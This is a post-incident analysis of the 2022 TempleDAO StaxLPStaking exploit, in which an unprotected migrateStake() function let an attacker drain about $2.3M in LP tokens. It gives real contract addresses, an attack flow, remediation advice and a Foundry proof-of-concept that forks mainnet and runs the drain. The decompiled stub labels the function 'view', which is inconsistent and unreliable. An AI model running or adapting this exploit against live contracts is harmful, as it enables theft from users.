# TempleDAO — migrateStake() Missing Access Control Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | TempleDAO (StaxLPStaking) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$2.3M |
| **Vulnerable Contract** | [0xd2869042e12a3506100af1d192b5b04d65137941](https://etherscan.io/address/0xd2869042e12a3506100af1d192b5b04d65137941) (StaxLPStaking) |
| **Attack Contract** | [0x2df9c154fe24d081cfe568645fb4075d725431e0](https://etherscan.io/address/0x2df9c154fe24d081cfe568645fb4075d725431e0) |
| **LP Token** | [0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9](https://etherscan.io/address/0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9) (xFraxTempleLP) |
| **Attacker** | [0x9c9fb3100a2a521985f0c47de3b4598dafd25b01](https://etherscan.io/address/0x9c9fb3100a2a521985f0c47de3b4598dafd25b01) |
| **Root Cause** | `migrateStake()` function has no access control, allowing calls from arbitrary addresses |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/Templedao_exp.sol) |

---
## 1. Vulnerability Overview

TempleDAO's `StaxLPStaking` contract provided a `migrateStake()` function to transfer user staking balances from the old staking contract to the new one. Despite being an admin function intended to be called only by a designated migrator address, it lacked an access control modifier. The attacker called `migrateStake()` by specifying the `StaxLPStaking` contract itself as the `staker` (old staking contract) and the attacker's contract as the recipient. All xFraxTempleLP tokens held by the contract were transferred to the attacker.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable migrateStake() - no access control
contract StaxLPStaking {
    IERC20 public immutable stakingToken; // xFraxTempleLP

    mapping(address => uint256) public stakedBalance;

    // ❌ No onlyMigrator or onlyOwner modifier
    // Anyone can call this to transfer the staking balance of an arbitrary address
    function migrateStake(address staker, uint256 amount) external {
        // ❌ No msg.sender validation
        // staker: old contract address (can be set arbitrarily)
        // amount: amount to transfer

        // Deducts staker's balance and transfers to msg.sender
        // In practice, pulls stakingToken from staker
        stakingToken.transferFrom(staker, msg.sender, amount);
        stakedBalance[msg.sender] += amount;
    }
}

// ✅ Correct pattern - access control applied
contract SafeStaxLPStaking {
    address public migrator;

    modifier onlyMigrator() {
        require(msg.sender == migrator, "Not migrator");
        _;
    }

    // ✅ Only the designated migrator can call this
    function migrateStake(address staker, uint256 amount) external onlyMigrator {
        stakingToken.transferFrom(staker, msg.sender, amount);
        stakedBalance[staker] -= amount;
        stakedBalance[msg.sender] += amount;
    }

    function setMigrator(address _migrator) external onlyOwner {
        migrator = _migrator;
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**StaxLPStaking_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: `migrateStake()` function has no access control, allowing calls from arbitrary addresses
    function migrateStake(address arg0, uint256 arg1) external view returns (uint256) {}  // 0xbdcd9c80  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Query xFraxTempleLP balance of StaxLPStaking contract
    │       balance = xFraxTempleLP.balanceOf(StaxLPStaking)
    │
    ├─[2] Call StaxLPStaking.migrateStake(
    │         staker = address(StaxLPStaking),  // ← the contract itself
    │         amount = balance                   // ← full balance
    │       )
    │       ❌ No access control
    │       → stakingToken.transferFrom(StaxLPStaking, attacker, balance)
    │       → Possible if StaxLPStaking has approved itself for its own tokens
    │
    ├─[3] Call withdrawAll(false)
    │       Withdraw full xFraxTempleLP balance without claiming rewards
    │
    └─[4] Net profit: ~$2.3M xFraxTempleLP
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IStaxLPStaking {
    // ❌ Migration function with no access control
    function migrateStake(address staker, uint256 amount) external;
    function withdrawAll(bool claimRewards) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract TempleDaoExploit is Test {
    IStaxLPStaking staking = IStaxLPStaking(0xd2869042e12a3506100af1d192b5b04d65137941);
    IERC20 lpToken = IERC20(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_725_066);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker LP", lpToken.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Contract LP", lpToken.balanceOf(address(staking)), 18);

        // [Step 1] Query total LP tokens held by the contract
        uint256 stakingBalance = lpToken.balanceOf(address(staking));

        // [Step 2] Call migrateStake() - no access control
        // staker = the staking contract itself, amount = full balance
        // ⚡ The contract's LP tokens are transferred to the attacker
        staking.migrateStake(address(staking), stakingBalance);

        // [Step 3] Withdraw the transferred staking balance
        staking.withdrawAll(false); // Withdraw without claiming rewards

        emit log_named_decimal_uint("[End] Attacker LP", lpToken.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Contract LP", lpToken.balanceOf(address(staking)), 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing access control on admin-only function |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Access Control Vulnerability |
| **Attack Vector** | `migrateStake(staking, fullBalance)` → `withdrawAll(false)` |
| **Precondition** | `migrateStake()` function lacks `onlyMigrator` or equivalent access control |
| **Impact** | ~$2.3M xFraxTempleLP lost |

---
## 6. Remediation Recommendations

1. **onlyMigrator modifier**: Add an `onlyMigrator` or `onlyOwner` modifier to `migrateStake()` so that only addresses trusted by the protocol can call it.
2. **Disable function after migration completes**: Once migration is complete, permanently disable or remove `migrateStake()`.
3. **Prohibit self-approval on staking contracts**: Avoid patterns where a staking contract grants approval to itself for tokens it holds.

---
## 7. Lessons Learned

- **Danger of migration functions**: Migration-specific functions such as `migrateStake()` and `migrateBalance()` move large amounts of funds by nature, making access control mandatory. These functions should be disabled immediately after deployment or upon migration completion.
- **Persistence of "temporary" features**: One-time functions like migrations that remain in the codebase for extended periods become attack surfaces. One-time admin functions must be removed or disabled after use.
- **Specifying the contract itself as staker**: The key to this attack was the attacker passing the staking contract's own address as the `staker` argument. When designing functions, adding an explicit guard blocking the `staker == address(this)` case is helpful.